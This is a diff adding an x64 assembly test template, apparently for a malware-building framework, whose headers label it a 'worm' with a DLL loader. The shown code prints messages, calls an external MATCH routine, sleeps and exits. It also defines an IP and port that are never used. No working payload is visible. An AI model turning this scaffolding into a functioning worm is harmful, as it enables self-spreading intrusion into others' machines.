@@ -1,0 +1,57 @@
+#!name##tester
+#!types##worm
+#!info##for test
+#!globalVar##COMPILER##mingw-x64##Compiler name
+#!globalVar##TARGET_OS##windows##Target OS
+#!globalVar##NO_DLL##True##Not include DLL
+#!processWorm##BasicCombo
+#!reqVar##DLL_NAME##name for dll##str
+#!setVar##DLL_NAME##ldr.dll##dll lib name
+#!lang##asm
+#!acceptMods##dll
+#!banned##shadow##starter
+#!system_FLAG##[W]
+
+; force RIP-relative addressing
+default rel
+
+extern ExitProcess
+extern printf
+extern MASTER
+extern MATCH
+extern Sleep
+
+section .data
+    text_exit: db "Exit Program", 10, 0
+    text_start: db "Start Program", 10, 0
+    IP: db "192.168.100.32", 0
+    PORT: equ 4000
+    
+
+section .text
+    global main
+
+main:
+    sub rsp, 8  ;allign stack
+    
+    
+    sub rsp, 32 ;shadow space
+    mov rcx, text_start
+    call printf
+    add rsp, 32
+    
+    sub rsp, 16
+    call MATCH
+    add rsp, 16
+    
+    ;sub rsp, 16 ;func space
+;    call MASTER
+;    add rsp, 16
+    
+    sub rsp, 32
+    mov rcx, 10000
+    call Sleep
+    mov rcx, text_exit
+    call printf
+    mov rcx, 0
+    call ExitProcess
